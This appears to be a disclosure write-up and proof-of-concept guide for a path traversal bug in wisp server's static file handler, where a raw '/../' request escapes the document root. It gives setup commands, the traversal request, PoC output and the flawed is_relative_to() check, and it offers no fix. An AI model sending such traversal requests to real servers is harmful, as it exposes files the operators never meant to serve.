# wisp server - static file path traversal

the static file handler joins the request path onto
the document root and then checks box with `Path.is_relative_to()`, but due to no sanitation `..` is treated as a normal path
component,a request containing a raw `..` can escape
the document root and is served with the `200 OK`.

You can find the lines at`src/wisp/server/http.py:102-107`.

## Who is affected

Only deployments started with `--static`.

| Server started with | `GET /../example.txt` |
|---|---|
| `--static C:\example\test` | `200 OK` + file contents |
| no `--static` | `404 Not Found` |

without `--static` the http handler never does anything with the filesystem, it will only serve the
default page for `/` and that is about it

the only thing is that the server can only read with the permission it was given (e.g. the account running the wisp instance).

## Requirements

- Python 3.9 or newer (tested with 3.13.1)
- The server's dependencies, installed by `pip install -e .`:

- `poc.py` uses only the standard library, so it runs with any Python 3.

## Setup

From the repository root:

# Please note this was done on a Windows not linux, depending on your OS the installation and setup process is different.
```powershell
cd z:\owo\wisp-server-py
python -m venv .venv
.venv\Scripts\activate
python -m pip install -e .
```

Create the simple layout. The document root is `z:\owo\static`;

```powershell
mkdir z:\owo\static
'<h1>wisp static demo</h1>' | Set-Content z:\owo\static\index.html
"this file is outside the document root" | Set-Content z:\owo\example.txt
```

## Run the server

```powershell
python -m wisp.server --host 127.0.0.1 --port 6001 --static z:\owo\static
```

## Run the poc

```powershell
python poc.py
```

expected output:

```
[*] 127.0.0.1:6001
[*] request line:
    GET /../example.txt HTTP/1.1

[*] response:
    HTTP/1.1 200 OK
    Content-Type: text/plain
    Server: wisp-server-python v0.9.0
    Content-Length: 40
    Connection: close

[*] body (40 bytes):
------------------------------------------------------------
this file is outside the document root
------------------------------------------------------------
[+] /../example.txt was served successfully
```

### options

| flag | default | meaning |
|---|---|---|
| `--host` | `127.0.0.1` | server address |
| `--port` | `6001` | server port |
| `--target` | `/../example.txt` | raw request target, sent verbatim |
| `--raw` | off | also print the full raw HTTP response |

## Root cause

```python
# src/wisp/server/http.py
target_path = static_path / path[1:]
...
if not target_path.is_relative_to(static_path):   # always True for ".."
    return 403, response_headers, "403 forbidden".encode()
```

`is_relative_to()` compares path parts. `z:\owo\static\..\example.txt` starts
with the parts of `z:\owo\static`, so it passes, and the file is served.

## Fix

uhhh whats that ?


:D
